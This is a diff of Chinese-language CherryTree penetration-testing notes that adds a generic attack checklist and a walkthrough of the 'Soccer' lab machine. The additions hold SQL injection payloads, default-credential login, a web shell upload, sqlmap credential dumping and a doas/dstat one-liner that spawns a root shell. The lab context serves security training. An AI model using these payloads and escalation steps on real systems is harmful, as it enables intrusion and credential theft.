@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="hack_tips" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649902547" ts_lastsave="1677576799">
+  <node name="hack_tips" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649902547" ts_lastsave="1677759359">
     <rich_text scale="h3" weight="heavy">需要安装的脚本工具：</rich_text>
     <rich_text>
 
@@ -44,10 +44,15 @@
     <rich_text foreground="#e0e01b1b2424">Priv-Escalation:</rich_text>
     <rich_text>
 </rich_text>
+    <rich_text link="webs https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh">https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</rich_text>
+    <rich_text>   扫描可能的提权点
+</rich_text>
     <rich_text link="webs https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</rich_text>
     <rich_text> 			</rich_text>
     <rich_text weight="heavy">LinEnum.sh</rich_text>
-    <rich_text> 扫描可能的提权点
+    <rich_text> 扫描可能的提权点，4年没更新。优先使用 </rich_text>
+    <rich_text weight="heavy">winPEAS</rich_text>
+    <rich_text>
 </rich_text>
     <rich_text link="webs https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</rich_text>
     <rich_text> Linux 权限提升审核工具，会分析列出可能提权的点并提供对应的 POC
@@ -74,7 +79,7 @@ kernel:
     <rich_text>
 </rich_text>
     <rich_text link="webs https://github.com/carlospolop/PEASS-ng/releases">https://github.com/carlospolop/PEASS-ng/releases</rich_text>
-    <rich_text>		</rich_text>
+    <rich_text>		权限提升扫描。</rich_text>
     <rich_text weight="heavy">winPEAS.exe</rich_text>
     <rich_text>	release 包直接下载 winPEASx64.exe 二进制文件
 </rich_text>
@@ -93,22 +98,47 @@ kernel:
     <rich_text foreground="#e0e01b1b2424">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </rich_text>
     <rich_text>
 
-
-
-
 </rich_text>
-    <rich_text scale="h3">1. login page </rich_text>
+    <rich_text scale="h3" weight="heavy">hack 步骤及常用操作</rich_text>
     <rich_text>
-• </rich_text>
+
+• ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.194 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//) 
+nmap -sC -sV -p $ports 10.10.11.194 -Pn
+扫描主机开放端口
+
+• 通过 ip 地址无法访问站点，尝试编辑 /etc/hosts 文件，添加 &lt;ip&gt; &lt;machine&gt;.htb 到文件中
+
+• 发现某些特殊服务框架，如 80 端口用的是 nostromo 1.9.6 框架，尝试用 searchsploit 搜索一下是否存在公共漏洞
+
+• 如果网页没有登录窗口且未发现特别的攻击点，尝试用 dirbuster 枚举一下网站目录
+
+• 未枚举到特殊目录，尝试枚举子域名
+ffuf -u </rich_text>
+    <rich_text link="webs http://10.10.11.196">http://10.10.11.196</rich_text>
+    <rich_text> -H "HOST: FUZZ.stocker.htb"  -w /root/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -c -ic -r -mc all -fw 4199
+
+• 发现登录页面，先手动尝试一下弱密码，及 sql 注入漏洞
+</rich_text>
     <rich_text weight="heavy">passwd guess</rich_text>
     <rich_text>
 user: admin, root, administrator, &lt;machine_title&gt;
 passwd: admin, password, root, &lt;machine_title&gt;
-• </rich_text>
+</rich_text>
     <rich_text weight="heavy">sql injection</rich_text>
     <rich_text>
 admin#
-admin'-- -   (-- 代表注释，后必须跟个空格才生效)
+admin'-- -   (-- 代表注释，mysql 后必须跟个空格才生效)
+
+• 数据库注入尝试
+如果是字符串加 ' ，如果是数字就不用加
+1 or 1=1
+1' or 1=1
+1" or 1=1
+1 and 1=1
+1' ORDER BY 1 -- -    （按第一列排序，一直试，直到某一列报错，比如 BY 4 报错，说明这条查询语句返回的列数为 3）
+1' UNION SELECT null,null,null-- - （SELECT 会在返回结果中插入一条数据，但返回数据列数和类型要统一。为了保证和实际数据类型统一，用 NULL 表示，如果三个 NULL 未报错，说明查询结果有 3 列）
+1' UNION SELECT 1,database(),3-- - （上条语句先确认返回列数，然后便可在返回数据中插入自己想要的数据，如 user(),database() 等等）
+
 
 </rich_text>
     <rich_text scale="h3">2.dig 工具是一个命令行工具，用于查询DNS名称服务器并检索有关域名的信息。
@@ -147,6 +177,8 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 lxc start privesc
 lxc exec privesc /bin/sh
 • LinEnum.sh 扫描可能的提权点
+
+• 查看 /etc/hosts 目录看看有没有其他子域名
 
 </rich_text>
     <rich_text scale="h3" weight="heavy">windows</rich_text>
@@ -234,7 +266,7 @@ msfvenom -l payloads 列出所有 payloads
 • Payloads 页面 Payloads options 中选择密码字典文件
 • 点击右上角 start attack 开始进行爆破
 • 点击 length 列排序，找到返回长度不同的那个请求观察结果</rich_text>
-    <codebox char_offset="3383" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">#include &lt;stdio.h&gt;
+    <codebox char_offset="4426" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 
 int main(int argc, char** argv) {
@@ -244,7 +276,7 @@ int main(int argc, char** argv) {
         return 0;
 }
 </codebox>
-    <codebox char_offset="3528" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) disas main	(显示对应方法的机器代码)
+    <codebox char_offset="4571" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) disas main	(显示对应方法的机器代码)
 Dump of assembler code for function main:
    0x0000000000001139 &lt;+0&gt;:     push   %rbp
    0x000000000000113a &lt;+1&gt;:     mov    %rsp,%rbp
@@ -262,7 +294,7 @@ Dump of assembler code for function main:
    0x0000000000001176 &lt;+61&gt;:    leave  
    0x0000000000001177 &lt;+62&gt;:    ret    
 End of assembler dump.</codebox>
-    <codebox char_offset="3658" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) run $(python2 -c 'print "\x41" * 526')
+    <codebox char_offset="4701" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) run $(python2 -c 'print "\x41" * 526')
 Program received signal SIGSEGV, Segmentation fault.
 0x0000414141414141 in ?? ()
 (gdb) info registers	(查看寄存器信息)
@@ -418,7 +450,7 @@ lrwxrwxrwx 1 root root 4 Sep  1 22:11 /bin/sh -&gt; </rich_text>
 
 </rich_text>
   </node>
-  <node name="linux" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675223633" ts_lastsave="1677209299">
+  <node name="linux" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675223633" ts_lastsave="1677641160">
     <rich_text weight="heavy">Linux 最基本的操作</rich_text>
     <rich_text>
 如果当你有什么命令不懂的时候 用以下命令 可以帮你解决很多疑惑
@@ -669,7 +701,12 @@ rar -a all.rar /home
     <rich_text>
 注意ssh配置文件 /etc/ssh/ssh_config 的修改。
 github 项目无法clone，提示 sha-1 不支持就是因为修改该文件导致，恢复原来即可。
-ssh 无法登录，提示KexAlgorithms等不支持之类的同样修改该文件。旧版本 ssh 登录文件在该文档目录下 ssh_config</rich_text>
+ssh 无法登录，提示KexAlgorithms等不支持之类的同样修改该文件。旧版本 ssh 登录文件在该文档目录下 ssh_config
+
+</rich_text>
+    <rich_text weight="heavy">设置时区，同步时间</rich_text>
+    <rich_text>
+dpkg-reconfigure tzdata     选择 asia-》shanghai</rich_text>
   </node>
   <node name="windows" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675320818" ts_lastsave="1675430727">
     <rich_text weight="heavy">1. </rich_text>
@@ -3772,7 +3809,7 @@ nostromo_1.9.6-1.deb  root.txt
     <rich_text>
 </rich_text>
   </node>
-  <node name="Stocker" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677499094" ts_lastsave="1677586888">
+  <node name="Stocker" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677499094" ts_lastsave="1677591992">
     <rich_text>1. ports=$(nmap -p- --min-rate=10000 -T4 10.10.11.196 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
 nmap -sC -sV -p $ports 10.10.11.196 -Pn
 Starting Nmap 7.93 ( </rich_text>
@@ -3945,6 +3982,151 @@ def get_usernames():
 
 for u in get_usernames():
     get_password(u)</codebox>
+  </node>
+  <node name="Soccer-websocket-sqli" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677591992" ts_lastsave="1677763672">
+    <rich_text>1. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.194 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//) 
+nmap -sC -sV -p $ports 10.10.11.194 -Pn
+Starting Nmap 7.93 ( </rich_text>
+    <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+    <rich_text> ) at 2023-02-28 08:50 EST
+Nmap scan report for 10.10.11.194
+Host is up (0.17s latency).
+
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
+|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
+|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
+80/tcp   open  http            nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to </rich_text>
+    <rich_text link="webs http://soccer.htb/">http://soccer.htb/</rich_text>
+    <rich_text>
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+9091/tcp open  xmltec-xmlmail?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+
+2. dirbuster 扫描到一个路径 tiny，访问 tiny 自动跳转到该登录页面
+</rich_text>
+    <rich_text link="webs http://soccer.htb/tiny/tinyfilemanager.php">http://soccer.htb/tiny/tinyfilemanager.php</rich_text>
+    <rich_text>
+
+3. searchsploit tiny file manager，发现一个 RCE 漏洞
+
+Tiny File Manager 2.4.6 - Remote Code Execution (RCE)                                      | php/webapps/50828.sh
+
+4. 通过网站 source code，发现版本 2.4.3,应该存在上述 rce 漏洞
+ &lt;a href="</rich_text>
+    <rich_text link="webs http://view-source:https://tinyfilemanager.github.io/">https://tinyfilemanager.github.io/</rich_text>
+    <rich_text>" target="_blank" class="text-muted" data-version="</rich_text>
+    <rich_text foreground="#e0e01b1b2424">2.4.3"</rich_text>
+    <rich_text>&gt;CCP Programmers&lt;/a&gt; &amp;mdash;&amp;mdash;
+ 
+5. 运行  50828.sh 脚本，需要稍作了些修改，成功运行，提示需要用户名和密码
+
+6.  google search “tiny file manager default credentials”
+ Default username/password: </rich_text>
+    <rich_text foreground="#e0e01b1b2424">admin/admin@123</rich_text>
+    <rich_text> and </rich_text>
+    <rich_text foreground="#e0e01b1b2424">user/12345</rich_text>
+    <rich_text>.
+ 
+ 7. </rich_text>
+    <rich_text foreground="#e0e01b1b2424">admin/admin@123</rich_text>
+    <rich_text> 可以成功登录，且只有 uploads 目录存在写权限，能正常上传
+ 
+ 8. 修改 50828.sh 脚本，上传接口 p=p=tiny/uploads，运行后仍提示失败 {"status":"error","info":"Error while uploading files. Uploaded files 0"}，反复尝试无效。
+ 
+ 9. 最后搜索 writeup 得知，上述操作把问题想复杂了，该网站不存在上述 REC 漏洞，但可以直接上传 rev_shell.php 脚本，然后访问 </rich_text>
+    <rich_text link="webs http://soccer.htb/tiny/uploads/rev_shell.php">http://soccer.htb/tiny/uploads/rev_shell.php</rich_text>
+    <rich_text>  即可。无语！！！！！
+ 
+ 10. 通过 /etc/hosts 或 /etc/nginx/sites-available/soc-player.htb 猜测还有一个子域名 soc-player.htb，访问该域名后得到另一个登录页面，注册后登录发现一个查询接口，猜测可能存在 sql 注入漏洞，但该接口是 websocket
+ google “websocket sql injection”  </rich_text>
+    <rich_text link="webs https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html</rich_text>
+    <rich_text>
+ 
+ 通过该网站获取websocket转http的 python 脚本，稍作修改后运行，然后新开窗口sqlmap成功发现 union injectable 漏洞，通过 burp  输入 {"id":"1 UNION SELECT NULL, NULL, NULL -- -"} 确实成功 “Ticket Exists”
+ 
+ sqlmap -u "</rich_text>
+    <rich_text link="webs http://localhost:8081/?id=1">http://localhost:8081/?id=1</rich_text>
+    <rich_text>" --batch --dbs
+ [20:12:38] [INFO] target URL appears to be UNION injectable with 3 columns
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] </rich_text>
+    <rich_text foreground="#e0e01b1b2424">soccer_db</rich_text>
+    <rich_text>
+[*] sys
+
+[20:24:22] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'
+
+成功检测出数据库
+
+sqlmap -u "</rich_text>
+    <rich_text link="webs http://localhost:8081/?id=1">http://localhost:8081/?id=1</rich_text>
+    <rich_text>" --batch -D soccer_db -T accounts --dump
+Database: soccer_db
+Table: accounts
+[1 entry]
++------+-------------------+----------------------+----------+
+| id   | email             | password             | username |
++------+-------------------+----------------------+----------+
+| 1324 | player@player.htb | </rich_text>
+    <rich_text foreground="#e0e01b1b2424">PlayerOftheMatch2022</rich_text>
+    <rich_text> | </rich_text>
+    <rich_text foreground="#e0e01b1b2424">player</rich_text>
+    <rich_text>   |
++------+-------------------+----------------------+----------+
+
+11. ssh player@10.10.11.194        登录成功获取 user flag。
+player@soccer:~$ cat user.txt 
+</rich_text>
+    <rich_text foreground="#e0e01b1b2424">507f583f04a69ee03bc3aebea249f7af</rich_text>
+    <rich_text>
+
+12. Priv-Escalation
+run linpeas.sh
+...........................
+╔══════════╣ Checking doas.conf
+</rich_text>
+    <rich_text foreground="#e0e01b1b2424">permit nopass player as root cmd /usr/bin/dstat </rich_text>
+    <rich_text>
+.............................
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
+╚ </rich_text>
+    <rich_text link="webs https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files">https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files</rich_text>
+    <rich_text>                                                                                                                                                   
+  Group </rich_text>
+    <rich_text foreground="#e0e01b1b2424">player</rich_text>
+    <rich_text>:                                                                                                                                                                                                                     
+/usr/local/share/dstat   
+........................................
+通过 linpeas.sh 扫描得知用 doas 命令（相当与 sudo）执行 /usr/bin/dstat 无需密码就可以以root用户运行，并且发现 /usr/local/share/dstat   该目录是 root 用户所有且属于 player组且 drwxrwx---  2 root player 4096 Mar  2 13:06 dstat
+通过 gtfobins 找到 dstat 运行sudo提权命令，并成功获取 root shell
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text weight="heavy">echo 'import os; os.execv("/bin/sh", ["sh"])' &gt;/usr/local/share/dstat/dstat_abc.py
+doas /usr/bin/dstat --abc</rich_text>
+    <rich_text>
+/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
+  import imp
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+</rich_text>
+    <rich_text foreground="#e0e01b1b2424">5f53702a9d9da8758049d2c7a01ed300</rich_text>
+    <rich_text>
+</rich_text>
+    <codebox char_offset="4203" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">echo 'import os; os.execv("/bin/sh", ["sh"])' &gt;/usr/local/share/dstat/dstat_xxx.py
+sudo dstat --xxx</codebox>
   </node>
   <node name="Legacy-Windows" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664271968" ts_lastsave="1675928583">
     <rich_text>1. nmap -sV -sC 10.10.10.4              
